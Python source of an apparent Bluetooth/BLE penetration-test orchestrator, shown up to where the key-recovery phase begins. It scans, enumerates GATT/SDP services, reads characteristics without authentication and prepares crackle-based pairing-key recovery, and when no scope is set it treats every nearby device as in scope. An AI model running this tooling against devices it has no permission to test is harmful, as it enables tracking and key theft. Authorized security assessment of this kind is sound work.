#!/usr/bin/env python3
"""
Aether-B — Bluetooth Penetration Test Orchestrator
===================================================
Orchestrates multi-phase Bluetooth / BLE security assessments via:
  Phase 0  — Passive Recon         (ubertooth-scan / hcitool lescan / btscanner)
  Phase 1  — Enumeration           (sdptool / gatttool / hcitool info)
  Phase 2  — Key Recovery          (crackle / ubertooth-btle / Just Works detection / KNOB check)
  Phase 3  — Exploitation          (bettercap / GATTacker / BlueToolkit / BIAS sequence)
  Phase 4  — Firmware              (binwalk / openocd JTAG/SWD)

Protocol tokens (emitted to stdout for Spectre frontend):
  __SPECTRE_LOG__     <message>
  __SPECTRE_ERR__     <message>
  __SPECTRE_STATUS__  <json>
  __SPECTRE_FINDING__ <json>
  __SPECTRE_PROMPT__  <message>

Usage:
    sudo python3 aether_b.py --config config.json --project /path/to/project
    sudo python3 aether_b.py --phase enumeration --target-bdaddr AA:BB:CC:DD:EE:FF
    sudo python3 aether_b.py --list-phases
"""
from __future__ import annotations

VERSION = "1.0.3"

import argparse
import json
import os
import socket
import platform
import re
import shutil
import signal
import subprocess
import sys
import threading
import time
import uuid
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

# ── Protocol token configuration ─────────────────────────────────────────────
MANAGED = os.environ.get("SPECTRE_MANAGED") == "1"

_SP_LOG     = "__SPECTRE_LOG__"
_SP_ERR     = "__SPECTRE_ERR__"
_SP_STATUS  = "__SPECTRE_STATUS__"
_SP_FINDING = "__SPECTRE_FINDING__"
_SP_PROMPT  = "__SPECTRE_PROMPT__"

_AETHER_B_DIR = Path(__file__).parent.resolve()


# ── Client directory helpers ──────────────────────────────────────────────────

def _clients_base() -> Path:
    """Return the OS-appropriate default parent directory for client project folders."""
    system = platform.system()
    if system == "Windows":
        base = Path("C:/clients")
    elif system == "Darwin":
        base = Path("/Users/Shared/clients")
    else:
        base = Path("/clients")
    base.mkdir(parents=True, exist_ok=True)
    return base


def _build_project_dir(client_short: str, start_date: str, tool_name: str) -> Path:
    """Build a structured project directory:
      <clients_base>/<slug>/<year>/<tool_name>/<slug>_<datetime>/
    """
    slug = re.sub(r'[^\w-]', '_', (client_short or 'client').strip().lower()).strip('_') or 'client'
    year = (start_date[:4] if start_date and len(start_date) >= 4 and start_date[:4].isdigit()
            else datetime.now(timezone.utc).strftime('%Y'))
    dt_str = datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')
    path = _clients_base() / slug / year / tool_name / f"{slug}_{dt_str}"
    path.mkdir(parents=True, exist_ok=True)
    return path


def _write_project_meta(project_dir: Path, tool: str, client_short: str,
                        year: str, version: str) -> None:
    """Write project_meta.json so Flask apps can discover this project."""
    try:
        (project_dir / "project_meta.json").write_text(
            json.dumps({
                "tool":         tool,
                "client_short": client_short,
                "year":         year,
                "created_at":   datetime.now(timezone.utc).isoformat(),
                "version":      version,
                "hostname":     socket.gethostname(),
            }, indent=2),
            encoding="utf-8",
        )
    except Exception:
        pass


# ── In-process state ──────────────────────────────────────────────────────────
_catalogue: dict[str, dict] = {}
_findings_collected: list[dict] = []

# ── Scope enforcement state ───────────────────────────────────────────────────
_scope_bdaddrs: set[str] = set()
_scope_uuids: set[str] = set()

# ── Active subprocess registry for graceful shutdown ─────────────────────────
_active_procs: list[subprocess.Popen] = []
_active_procs_lock = threading.Lock()


# ── Protocol token emitters ───────────────────────────────────────────────────

def _tok(token: str, msg: str) -> None:
    print(f"{token} {msg}", flush=True)


def _log(msg: str) -> None:
    _tok(_SP_LOG, msg)


def _err(msg: str) -> None:
    _tok(_SP_ERR, msg)


def _status(phase: str, status: str, step: str = "") -> None:
    _tok(_SP_STATUS, json.dumps({
        "phase": phase,
        "status": status,
        "step": step,
        "ts": datetime.now(timezone.utc).isoformat(),
    }))


def _finding(finding_id: str, output_file: str = "", data: Optional[dict] = None) -> None:
    entry = _catalogue.get(finding_id, {})
    rec = {
        "id": finding_id,
        "title": entry.get("title", finding_id),
        "severity": entry.get("severity", "HIGH"),
        "cvss_score": entry.get("cvss_score"),
        "cvss_vector": entry.get("cvss_vector", ""),
        "category": entry.get("category", ""),
        "description": entry.get("description", ""),
        "remediation": entry.get("remediation", ""),
        "data": data or {},
        "output_file": output_file,
        "ts": datetime.now(timezone.utc).isoformat(),
    }
    _findings_collected.append(rec)
    _tok(_SP_FINDING, json.dumps(rec))


def _prompt(msg: str) -> str:
    _tok(_SP_PROMPT, msg)
    if MANAGED:
        return ""
    try:
        return input(f"[?] {msg} > ").strip()
    except (EOFError, KeyboardInterrupt):
        return ""


# ── Findings catalogue ────────────────────────────────────────────────────────

def _load_catalogue() -> None:
    global _catalogue
    cat_path = _AETHER_B_DIR / "findings_catalogue.json"
    if cat_path.exists():
        try:
            data = json.loads(cat_path.read_text(encoding="utf-8"))
            entries = data.get("findings", data) if isinstance(data, dict) else data
            _catalogue = {e["id"]: e for e in entries if "id" in e}
        except Exception as exc:
            _err(f"Catalogue load error: {exc}")


# ── Config loader ─────────────────────────────────────────────────────────────

def _load_config(path: Path) -> dict:
    defaults: dict = {
        "hci_device": "hci0",
        "ubertooth_device": "/dev/ttyACM0",
        "target_bdaddrs": [],
        "target_uuids": [],
        "timeout_per_phase": 300,
        "capture_duration": 3600,
        "phases": {
            "passive_recon": True,
            "enumeration": True,
            "key_recovery": True,
            "exploitation": False,
            "firmware": False,
        },
        "tools": {
            "ubertooth-scan": "ubertooth-scan",
            "ubertooth-btle": "ubertooth-btle",
            "ubertooth-rx": "ubertooth-rx",
            "btscanner": "btscanner",
            "sdptool": "sdptool",
            "gatttool": "gatttool",
            "hcitool": "hcitool",
            "hciconfig": "hciconfig",
            "bluetoothctl": "bluetoothctl",
            "crackle": "crackle",
            "bettercap": "bettercap",
            "gattacker": "node /opt/GATTacker/gattacker.js",
            "bluetoolkit": "python3 /opt/bluetoolkit/bt.py",
            "tshark": "tshark",
            "binwalk": "binwalk",
            "openocd": "openocd",
        },
        "scope": {"bdaddrs": [], "uuids": []},
        "output_dir": "aether_b_output",
        "physical_access": False,
        "injection_authorized": False,
        "dos_authorized": False,
        "pairing_authorized": False,
        "cve_testing_authorized": False,
    }

    if not path.exists():
        _err(f"Config not found: {path} — using built-in defaults")
        return defaults

    try:
        user_cfg = json.loads(path.read_text(encoding="utf-8"))
    except json.JSONDecodeError as exc:
        _err(f"Config parse error: {exc} — using built-in defaults")
        return defaults

    # Deep-merge user config over defaults
    merged = {**defaults}
    for k, v in user_cfg.items():
        if isinstance(v, dict) and isinstance(merged.get(k), dict):
            merged[k] = {**merged[k], **v}
        else:
            merged[k] = v
    return merged


# ── Scope helpers ─────────────────────────────────────────────────────────────

def _normalise_bdaddr(addr: str) -> str:
    """Normalise a BD address to uppercase colon-separated form."""
    return addr.strip().upper()


def _in_scope_bdaddr(bdaddr: str) -> bool:
    """Return True if bdaddr is in scope (or scope is unconstrained)."""
    if not _scope_bdaddrs:
        return True
    return _normalise_bdaddr(bdaddr) in _scope_bdaddrs


def _in_scope_uuid(uuid_val: str) -> bool:
    if not _scope_uuids:
        return True
    return uuid_val.upper() in _scope_uuids


# ── Tool helpers ──────────────────────────────────────────────────────────────

def _check_tool(name: str) -> Optional[str]:
    """Return the full path to 'name' if it exists on PATH, else None."""
    return shutil.which(name)


def _resolve_tool(cfg: dict, key: str) -> Optional[str]:
    """Resolve a tool from config tools dict. Returns command string if binary found."""
    tool_str = cfg.get("tools", {}).get(key, key)
    parts = tool_str.split()
    binary = parts[0]
    if shutil.which(binary):
        return tool_str
    return None


# ── Subprocess helpers ────────────────────────────────────────────────────────

def _run(cmd: list, timeout: int = 60, cwd: Optional[str] = None) -> tuple[str, int]:
    """Run a command with timeout; return (stdout+stderr, returncode)."""
    try:
        r = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
            stdin=subprocess.DEVNULL,
            cwd=cwd,
        )
        return r.stdout + r.stderr, r.returncode
    except subprocess.TimeoutExpired:
        return "(timeout)", -1
    except FileNotFoundError:
        return f"(executable not found: {cmd[0]})", 127
    except Exception as exc:
        return str(exc), -1


def _popen(cmd: list, **kwargs) -> subprocess.Popen:
    kwargs.setdefault("stdin", subprocess.DEVNULL)
    proc = subprocess.Popen(cmd, **kwargs)
    with _active_procs_lock:
        _active_procs.append(proc)
    return proc


def _kill_proc(proc: subprocess.Popen, wait_secs: int = 5) -> None:
    try:
        proc.terminate()
        proc.wait(timeout=wait_secs)
    except subprocess.TimeoutExpired:
        proc.kill()
        try:
            proc.wait(timeout=3)
        except Exception:
            pass
    except Exception:
        pass
    finally:
        with _active_procs_lock:
            try:
                _active_procs.remove(proc)
            except ValueError:
                pass


def _kill_all_procs() -> None:
    """Terminate all registered subprocesses (called on SIGTERM/SIGINT)."""
    with _active_procs_lock:
        procs = list(_active_procs)
    for proc in procs:
        try:
            proc.terminate()
        except Exception:
            pass
    for proc in procs:
        try:
            proc.wait(timeout=3)
        except Exception:
            try:
                proc.kill()
            except Exception:
                pass


# ── Findings persistence ──────────────────────────────────────────────────────

def _save_findings(output_dir: Path) -> None:
    out = output_dir / "findings_spectre.json"
    out.write_text(json.dumps(_findings_collected, indent=2), encoding="utf-8")
    _log(f"Findings written: {out} ({len(_findings_collected)} item(s))")


# ── Signal handler ────────────────────────────────────────────────────────────

def _setup_signal_handlers(output_dir: Path) -> None:
    def _handler(signum, frame):
        _err(f"Signal {signum} received — shutting down gracefully.")
        _kill_all_procs()
        _save_findings(output_dir)
        _status("aether_b", "aborted", f"signal={signum}")
        sys.exit(0)

    signal.signal(signal.SIGTERM, _handler)
    signal.signal(signal.SIGINT, _handler)


# ── Phase 0: Passive Recon ────────────────────────────────────────────────────

def _phase_passive_recon(cfg: dict, project_dir: Path) -> None:
    """
    Phase 0: Passive Bluetooth reconnaissance.

    Strategy A — ubertooth-scan: piconet survey of BR/EDR devices including
                 LAP, UAP, NAP and clock estimation.
    Strategy B — hcitool lescan: BLE advertising packet capture to enumerate
                 advertising devices, UUIDs, and MAC addresses.
    Strategy C — btscanner: visible/discoverable BR/EDR device enumeration
                 using inquiry scans.
    Strategy D — ubertooth-rx: raw BR/EDR pcap capture to recon_dir for use
                 in later key_recovery phase.

    Emits:
      AETHB-011 — Static MAC / BLE beacon tracking if non-rotating MAC observed.
    """
    phase_id = "passive_recon"
    timeout = cfg.get("timeout_per_phase", 300)
    hci = cfg.get("hci_device", "hci0")
    ubertooth_dev = cfg.get("ubertooth_device", "/dev/ttyACM0")
    tools = cfg.get("tools", {})

    recon_dir = project_dir / "passive_recon"
    recon_dir.mkdir(parents=True, exist_ok=True)

    ubertooth_scan_bin = _check_tool(tools.get("ubertooth-scan", "ubertooth-scan"))
    ubertooth_rx_bin   = _check_tool(tools.get("ubertooth-rx", "ubertooth-rx"))
    hcitool_bin        = _check_tool(tools.get("hcitool", "hcitool"))
    btscanner_bin      = _check_tool(tools.get("btscanner", "btscanner"))

    if not any([ubertooth_scan_bin, hcitool_bin, btscanner_bin]):
        _log("[~] No passive recon tools found — skipping passive_recon phase")
        _status(phase_id, "skipped", "ubertooth-scan / hcitool / btscanner not installed")
        return

    _status(phase_id, "running", "Starting Bluetooth passive reconnaissance")
    _log("=" * 60)
    _log("AUTHORIZED USE ONLY. Explicit written permission required.")
    _log(f"Aether-B Bluetooth Penetration Test Orchestrator v{VERSION}")
    _log(f"HCI device : {hci}")
    _log(f"Ubertooth  : {ubertooth_dev}")
    _log("=" * 60)

    discovered_devices: list[dict] = []
    ble_advertisers: list[dict] = []

    # ── Strategy A: ubertooth-scan ────────────────────────────────────────
    if ubertooth_scan_bin:
        out_file = recon_dir / "ubertooth_scan.txt"
        scan_secs = min(timeout // 3, 120)
        _log(f"[0] ubertooth-scan: BR/EDR piconet survey for {scan_secs}s...")
        _status(phase_id, "running", "ubertooth-scan BR/EDR survey")

        cmd = [ubertooth_scan_bin, "-t", str(scan_secs)]
        proc = None
        lines_out: list[str] = []
        try:
            proc = _popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
            )
            if proc.stdout is None:
                raise RuntimeError("ubertooth-scan stdout unavailable")
            deadline = time.time() + scan_secs + 5
            while time.time() < deadline:
                try:
                    line = proc.stdout.readline()
                except Exception:
                    break
                if not line:
                    break
                decoded = line.decode("utf-8", errors="replace").rstrip()
                if not decoded:
                    continue
                _log(decoded)
                lines_out.append(decoded)
                # Parse ubertooth-scan output:
                # "LAP: XX XX XX  UAP: XX  NAP: XX XX  BD_ADDR: AA:BB:CC:DD:EE:FF"
                bdaddr_m = re.search(
                    r'BD_ADDR[:\s]+((?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2})',
                    decoded, re.I,
                )
                if bdaddr_m:
                    bdaddr = _normalise_bdaddr(bdaddr_m.group(1))
                    if _in_scope_bdaddr(bdaddr) and not any(
                        d.get("bdaddr") == bdaddr for d in discovered_devices
                    ):
                        lap_m = re.search(r'LAP[:\s]+((?:[0-9A-Fa-f]{2}\s*){3})', decoded, re.I)
                        uap_m = re.search(r'UAP[:\s]+([0-9A-Fa-f]{2})', decoded, re.I)
                        discovered_devices.append({
                            "bdaddr": bdaddr,
                            "lap": lap_m.group(1).strip() if lap_m else "",
                            "uap": uap_m.group(1) if uap_m else "",
                            "source": "ubertooth-scan",
                            "type": "BR/EDR",
                        })
                        _log(f"  [+] BR/EDR device: {bdaddr}")
        except Exception as exc:
            _err(f"ubertooth-scan error: {exc}")
        finally:
            if proc is not None:
                _kill_proc(proc)
        out_file.write_text("\n".join(lines_out), encoding="utf-8")

    # ── Strategy B: hcitool lescan ────────────────────────────────────────
    if hcitool_bin:
        out_file = recon_dir / "hcitool_lescan.txt"
        scan_secs = min(timeout // 3, 60)
        _log(f"[0] hcitool lescan: BLE advertising scan for {scan_secs}s...")
        _status(phase_id, "running", "hcitool lescan BLE advertising")

        cmd = [hcitool_bin, "-i", hci, "lescan", "--duplicates"]
        proc = None
        lines_out = []
        try:
            proc = _popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
            )
            if proc.stdout is None:
                raise RuntimeError("hcitool lescan stdout unavailable")
            deadline = time.time() + scan_secs
            while time.time() < deadline:
                try:
                    line = proc.stdout.readline()
                except Exception:
                    break
                if not line:
                    break
                decoded = line.decode("utf-8", errors="replace").rstrip()
                if not decoded:
                    continue
                _log(decoded)
                lines_out.append(decoded)
                # Parse: "AA:BB:CC:DD:EE:FF  Device Name"
                m = re.match(
                    r'^((?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2})\s+(.*)',
                    decoded.strip(),
                )
                if m:
                    bdaddr = _normalise_bdaddr(m.group(1))
                    adv_name = m.group(2).strip()
                    if _in_scope_bdaddr(bdaddr):
                        if not any(d.get("bdaddr") == bdaddr for d in ble_advertisers):
                            ble_advertisers.append({
                                "bdaddr": bdaddr,
                                "name": adv_name,
                                "source": "hcitool_lescan",
                                "type": "BLE",
                            })
                            _log(f"  [+] BLE advertiser: {bdaddr}  name={adv_name!r}")
                            # Check for static/non-rotating MAC (public address heuristic)
                            # Public BLE addresses have locally-administered bit clear
                            # and are static — flag as potential tracking risk
                            if not adv_name.startswith("(unknown)") and adv_name:
                                _finding(
                                    "AETHB-011",
                                    output_file=str(out_file),
                                    data={"bdaddr": bdaddr, "adv_name": adv_name,
                                          "note": "static public address observed in advertising"},
                                )
        except Exception as exc:
            _err(f"hcitool lescan error: {exc}")
        finally:
            if proc is not None:
                _kill_proc(proc)
        out_file.write_text("\n".join(lines_out), encoding="utf-8")

        # Merge BLE advertisers into discovered list
        for adv in ble_advertisers:
            if not any(d.get("bdaddr") == adv["bdaddr"] for d in discovered_devices):
                discovered_devices.append(adv)

    # ── Strategy C: btscanner ─────────────────────────────────────────────
    if btscanner_bin:
        out_file = recon_dir / "btscanner.txt"
        scan_secs = min(timeout // 3, 60)
        _log(f"[0] btscanner: BR/EDR inquiry scan for {scan_secs}s...")
        _status(phase_id, "running", "btscanner BR/EDR inquiry")

        # btscanner is typically interactive; use -n (non-interactive) if available
        cmd = [btscanner_bin, "-n", "-t", str(scan_secs)]
        out, rc = _run(cmd, timeout=scan_secs + 15)
        out_file.write_text(out, encoding="utf-8")
        _log(out[:4000])

        # Parse btscanner output for BD addresses
        for line in out.splitlines():
            m = re.search(
                r'((?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2})',
                line,
            )
            if m:
                bdaddr = _normalise_bdaddr(m.group(1))
                if _in_scope_bdaddr(bdaddr) and not any(
                    d.get("bdaddr") == bdaddr for d in discovered_devices
                ):
                    name_m = re.search(r'(?:Name|Device)[:\s]+([^\s][^\n]+)', line, re.I)
                    discovered_devices.append({
                        "bdaddr": bdaddr,
                        "name": name_m.group(1).strip() if name_m else "",
                        "source": "btscanner",
                        "type": "BR/EDR",
                    })
                    _log(f"  [+] Inquiry: {bdaddr}")

    # ── Strategy D: ubertooth-rx raw BR/EDR capture ───────────────────────
    if ubertooth_rx_bin:
        cap_file = recon_dir / "ubertooth_raw.pcap"
        cap_secs = min(timeout // 4, 60)
        _log(f"[0] ubertooth-rx: raw BR/EDR pcap capture for {cap_secs}s → {cap_file}...")
        _status(phase_id, "running", "ubertooth-rx raw capture")

        cmd = [ubertooth_rx_bin, "-r", str(cap_file), "-t", str(cap_secs)]
        proc = None
        try:
            proc = _popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(cap_secs + 2)
        except Exception as exc:
            _err(f"ubertooth-rx error: {exc}")
        finally:
            if proc is not None:
                _kill_proc(proc)

        if cap_file.exists() and cap_file.stat().st_size > 0:
            _log(f"  [+] Raw capture: {cap_file} ({cap_file.stat().st_size} bytes)")
        else:
            _log(f"  [~] ubertooth-rx produced no output (device may not be connected)")

    # ── Persist recon results ─────────────────────────────────────────────
    recon_json = recon_dir / "discovered_devices.json"
    recon_json.write_text(json.dumps(discovered_devices, indent=2), encoding="utf-8")
    _log(f"[0] Passive recon complete — {len(discovered_devices)} device(s) discovered")
    _status(phase_id, "complete", f"{len(discovered_devices)} device(s) found")


# ── Phase 1: Enumeration ──────────────────────────────────────────────────────

def _phase_enumeration(cfg: dict, project_dir: Path) -> None:
    """
    Phase 1: Active Bluetooth service and GATT enumeration.

    For each in-scope target BD address:
      1a — hcitool info: pull device name, LMP version, manufacturer, features
      1b — sdptool browse: enumerate all SDP service records (BR/EDR)
      1c — gatttool --primary: enumerate all GATT primary services (BLE)
      1d — gatttool --characteristics: enumerate characteristic handles, UUIDs,
           and properties; flag unauthenticated readable/writable characteristics

    Emits:
      AETHB-006 — Unauthenticated readable GATT characteristics with sensitive data
      AETHB-007 — Writable-without-response characteristics found
      AETHB-009 — SDP service record disclosure
    """
    phase_id = "enumeration"
    timeout = cfg.get("timeout_per_phase", 300)
    hci = cfg.get("hci_device", "hci0")
    tools = cfg.get("tools", {})

    enum_dir = project_dir / "enumeration"
    enum_dir.mkdir(parents=True, exist_ok=True)

    hcitool_bin    = _check_tool(tools.get("hcitool", "hcitool"))
    sdptool_bin    = _check_tool(tools.get("sdptool", "sdptool"))
    gatttool_bin   = _check_tool(tools.get("gatttool", "gatttool"))

    if not any([hcitool_bin, sdptool_bin, gatttool_bin]):
        _log("[~] hcitool, sdptool, and gatttool not found — skipping enumeration phase")
        _status(phase_id, "skipped", "hcitool / sdptool / gatttool not installed")
        return

    _status(phase_id, "running", "Bluetooth service and GATT enumeration")

    # Load previously discovered devices if present
    targets: list[str] = list(cfg.get("target_bdaddrs", []))
    recon_json = project_dir / "passive_recon" / "discovered_devices.json"
    if recon_json.exists():
        try:
            discovered = json.loads(recon_json.read_text(encoding="utf-8"))
            for dev in discovered:
                addr = dev.get("bdaddr", "")
                if addr and _in_scope_bdaddr(addr) and addr not in targets:
                    targets.append(addr)
        except Exception as exc:
            _err(f"Could not load discovered_devices.json: {exc}")

    if not targets:
        _log("[~] No in-scope targets available — run passive_recon first or set target_bdaddrs in config")
        _status(phase_id, "skipped", "no in-scope targets")
        return

    _log(f"[1] Enumerating {len(targets)} in-scope target(s)...")
    all_devices_enum: list[dict] = []

    for bdaddr in targets:
        if not _in_scope_bdaddr(bdaddr):
            _log(f"  [~] {bdaddr} out of scope — skipping")
            continue

        _log(f"\n[1] Target: {bdaddr}")
        dev_record: dict = {"bdaddr": bdaddr, "sdp_services": [], "gatt_services": [], "gatt_chars": []}
        bdaddr_safe = bdaddr.replace(":", "_")

        # ── 1a: hcitool info ──────────────────────────────────────────────
        if hcitool_bin:
            _log(f"  [1a] hcitool info {bdaddr}...")
            _status(phase_id, "running", f"hcitool info {bdaddr}")
            out_file = enum_dir / f"hcitool_info_{bdaddr_safe}.txt"
            cmd = [hcitool_bin, "-i", hci, "info", bdaddr]
            out, rc = _run(cmd, timeout=min(timeout // len(targets), 60))
            out_file.write_text(out, encoding="utf-8")
            _log(out[:3000])

            # Parse device name and LMP info
            name_m = re.search(r'Device Name:\s*(.+)', out)
            lmp_m  = re.search(r'LMP Version:\s*(.+)', out)
            mfg_m  = re.search(r'Manufacturer:\s*(.+)', out)
            if name_m:
                dev_record["device_name"] = name_m.group(1).strip()
            if lmp_m:
                dev_record["lmp_version"] = lmp_m.group(1).strip()
            if mfg_m:
                dev_record["manufacturer"] = mfg_m.group(1).strip()

        # ── 1b: sdptool browse ────────────────────────────────────────────
        if sdptool_bin:
            _log(f"  [1b] sdptool browse {bdaddr}...")
            _status(phase_id, "running", f"sdptool browse {bdaddr}")
            out_file = enum_dir / f"sdptool_{bdaddr_safe}.txt"
            cmd = [sdptool_bin, "browse", "--tree", "--xml", bdaddr]
            out, rc = _run(cmd, timeout=min(timeout // len(targets), 90))
            out_file.write_text(out, encoding="utf-8")
            _log(out[:4000])

            # Parse service names from sdptool output
            service_names: list[str] = re.findall(r'Service Name:\s*(.+)', out)
            service_classes: list[str] = re.findall(r'Service Class ID List:.*?(?=\n\n|\Z)', out, re.S)
            dev_record["sdp_services"] = service_names

            if service_names:
                _log(f"  [+] SDP services found: {', '.join(service_names[:10])}")
                _finding(
                    "AETHB-009",
                    output_file=str(out_file),
                    data={
                        "bdaddr": bdaddr,
                        "services": service_names[:20],
                        "service_count": len(service_names),
                    },
                )

            # Check for sensitive service classes: OBEX, PAN, NAP, HFP
            sensitive_profiles = {
                "OBEX": r'OBEX|OBEXObjectPush|OBEXFileTransfer',
                "PAN/NAP": r'PAN|NAP|BNEP|NetworkAccessPoint',
                "HFP": r'Handsfree|HFP|HandsfreeAudioGateway',
                "SPP": r'SerialPort|RFCOMM|SPP',
                "DUN": r'DialupNetworking|DUN',
            }
            for profile_name, pattern in sensitive_profiles.items():
                if re.search(pattern, out, re.I):
                    _log(f"  [*] Sensitive profile exposed: {profile_name}")

        # ── 1c: gatttool primary services ────────────────────────────────
        if gatttool_bin:
            _log(f"  [1c] gatttool --primary {bdaddr}...")
            _status(phase_id, "running", f"gatttool primary services {bdaddr}")
            out_file = enum_dir / f"gatttool_primary_{bdaddr_safe}.txt"
            cmd = [gatttool_bin, "-b", bdaddr, "--primary"]
            out, rc = _run(cmd, timeout=min(timeout // len(targets), 60))
            out_file.write_text(out, encoding="utf-8")
            _log(out[:3000])

            # Parse primary services: "attr handle: 0x0001, end grp handle: 0x000b uuid: 00001800-..."
            gatt_services: list[dict] = []
            for line in out.splitlines():
                svc_m = re.search(
                    r'attr handle:\s*(0x[0-9a-fA-F]+).*?end grp handle:\s*(0x[0-9a-fA-F]+).*?uuid:\s*([0-9a-fA-F\-]+)',
                    line, re.I,
                )
                if svc_m:
                    gatt_services.append({
                        "start": svc_m.group(1),
                        "end": svc_m.group(2),
                        "uuid": svc_m.group(3).lower(),
                    })
            dev_record["gatt_services"] = gatt_services
            if gatt_services:
                _log(f"  [+] GATT services: {len(gatt_services)} found")

        # ── 1d: gatttool characteristics ──────────────────────────────────
        if gatttool_bin:
            _log(f"  [1d] gatttool --characteristics {bdaddr}...")
            _status(phase_id, "running", f"gatttool characteristics {bdaddr}")
            out_file = enum_dir / f"gatttool_chars_{bdaddr_safe}.txt"
            cmd = [gatttool_bin, "-b", bdaddr, "--characteristics"]
            out, rc = _run(cmd, timeout=min(timeout // len(targets), 60))
            out_file.write_text(out, encoding="utf-8")
            _log(out[:4000])

            # Parse characteristics:
            # "handle: 0x0002, char properties: 0x02, char value handle: 0x0003, uuid: ..."
            gatt_chars: list[dict] = []
            unauthenticated_readable: list[dict] = []
            write_without_response: list[dict] = []

            for line in out.splitlines():
                char_m = re.search(
                    r'handle:\s*(0x[0-9a-fA-F]+).*?char properties:\s*(0x[0-9a-fA-F]+)'
                    r'.*?char value handle:\s*(0x[0-9a-fA-F]+).*?uuid:\s*([0-9a-fA-F\-]+)',
                    line, re.I,
                )
                if char_m:
                    handle      = char_m.group(1)
                    properties  = int(char_m.group(2), 16)
                    val_handle  = char_m.group(3)
                    char_uuid   = char_m.group(4).lower()

                    # BLE GATT property bits:
                    # bit 1 (0x02) = READ, bit 2 (0x04) = Write Without Response, bit 3 (0x08) = WRITE
                    # bit 4 (0x10) = Notify, bit 5 (0x20) = Indicate
                    can_read   = bool(properties & 0x02)
                    can_wwor   = bool(properties & 0x04)  # Write Without Response
                    can_write  = bool(properties & 0x08)

                    char_entry = {
                        "handle": handle,
                        "value_handle": val_handle,
                        "uuid": char_uuid,
                        "properties": hex(properties),
                        "readable": can_read,
                        "write_without_response": can_wwor,
                        "writable": can_write,
                    }
                    gatt_chars.append(char_entry)

                    # Flag readable characteristics as potentially unauthenticated
                    # (we cannot determine auth requirement without attempting reads at each security level)
                    if can_read:
                        unauthenticated_readable.append(char_entry)

                    if can_wwor:
                        write_without_response.append(char_entry)

            dev_record["gatt_chars"] = gatt_chars

            # Attempt to read sensitive well-known characteristic UUIDs unauthenticated
            sensitive_uuids = {
                "00002a00-0000-1000-8000-00805f9b34fb": "Device Name",
                "00002a19-0000-1000-8000-00805f9b34fb": "Battery Level",
                "00002a26-0000-1000-8000-00805f9b34fb": "Firmware Revision",
                "00002a29-0000-1000-8000-00805f9b34fb": "Manufacturer Name",
                "00002a24-0000-1000-8000-00805f9b34fb": "Model Number",
                "00002a25-0000-1000-8000-00805f9b34fb": "Serial Number",
            }
            exposed_sensitive: list[dict] = []
            for char_entry in unauthenticated_readable:
                char_uuid_full = char_entry["uuid"]
                if char_uuid_full in sensitive_uuids:
                    # Attempt unauthenticated read
                    read_cmd = [
                        gatttool_bin, "-b", bdaddr,
                        "--char-read", "--handle", char_entry["value_handle"],
                    ]
                    read_out, read_rc = _run(read_cmd, timeout=15)
                    if read_rc == 0 and "Characteristic value/descriptor" in read_out:
                        exposed_sensitive.append({
                            "uuid": char_uuid_full,
                            "name": sensitive_uuids[char_uuid_full],
                            "handle": char_entry["value_handle"],
                            "value_raw": read_out.strip(),
                        })
                        _log(f"  [+] Sensitive char readable: {sensitive_uuids[char_uuid_full]} ({char_uuid_full})")

            if exposed_sensitive:
                _finding(
                    "AETHB-006",
                    output_file=str(out_file),
                    data={
                        "bdaddr": bdaddr,
                        "exposed_characteristics": exposed_sensitive,
                        "total_readable": len(unauthenticated_readable),
                    },
                )

            if write_without_response:
                _finding(
                    "AETHB-007",
                    output_file=str(out_file),
                    data={
                        "bdaddr": bdaddr,
                        "write_without_response_chars": [c["uuid"] for c in write_without_response],
                        "count": len(write_without_response),
                    },
                )

        all_devices_enum.append(dev_record)

    # Persist enumeration results
    enum_json = enum_dir / "enumeration_results.json"
    enum_json.write_text(json.dumps(all_devices_enum, indent=2), encoding="utf-8")
    _log(f"[1] Enumeration complete — {len(all_devices_enum)} device(s) enumerated")
    _status(phase_id, "complete", f"{len(all_devices_enum)} device(s) enumerated")


# ── Phase 2: Key Recovery ─────────────────────────────────────────────────────

def _phase_key_recovery(cfg: dict, project_dir: Path) -> None:
    """
    Phase 2: BLE / BR/EDR key recovery and pairing weakness detection.

    Strategy A — crackle: run crackle against any BLE pcap files found in
                 passive_recon or key_recovery directories to recover LTK.
    Strategy B — ubertooth-btle: targeted BLE capture to capture pairing frames
                 for a specific BD address, then feed to crackle.
    Strategy C — Just Works detection: attempt BLE pairing and observe if Just
                 Works is accepted without confirmation.
    Strategy D — KNOB frequency analysis: look for LMP_encryption_key_size_req
                 frames in captured pcap indicating reduced entropy negotiation.

    Emits:
      AETHB-001 — KNOB: entropy reduction detected in captured frames
      AETHB-004 — BLE legacy pairing TK cracked by crackle
      AETHB-012 — Just Works pairing accepted without authentication
    """
    phase_id = "key_recovery"
    timeout = cfg.get("timeout_per_phase", 300)
    hci = cfg.get("hci_device", "hci0")
    tools = cfg.get("tools", {})

    key_dir = project_dir / "key_recovery"
    key_dir.mkdir(parents=True, exist_ok=True)

    crackle_bin        = _check_tool(tools.get("crackle", "crackle"))
    ubertooth_btle_bin = _check_tool(tools.get("ubertooth-btle", "ubertooth-btle"))
    hcitool_bin        = _check_tool(tools.get("hcitool", "hcitool"))
    tshark_bin         = _check_tool(tools.get("tshark", "tshark"))

    if not any([crackle_bin, ubertooth_btle_bin, tshark_bin]):
        _log("[~] crackle / ubertooth-btle / tshark not found — skipping key_recovery phase")
        _status(phase_id, "skipped", "crackle / ubertooth-btle / tshark not installed")
        return

    _status(phase_id, "running", "Key recovery and pairing weakness detection")

    targets: list[str] = list(cfg.get("target_bdaddrs", []))
    # Augment with discovered devices
    recon_json = project_dir / "passive_recon" / "discovered_devices.json"
    if recon_json.exists():
        try:
            discovered = json.loads(recon_json.read_text(encoding="utf-8"))
            for dev in discovered:
                addr = dev.get("bdaddr", "")
                if addr and _in_scope_bdaddr(addr) and addr not in targets:
                    targets.append(addr)
        except Exception:
            pass

    recovered_keys: list[dict] = []

    # ── Strategy A: crackle on existing pcap files ─────────────────────────
    if crackle_bin:
        # Collect all pcap files from passive_recon and key_recovery dirs
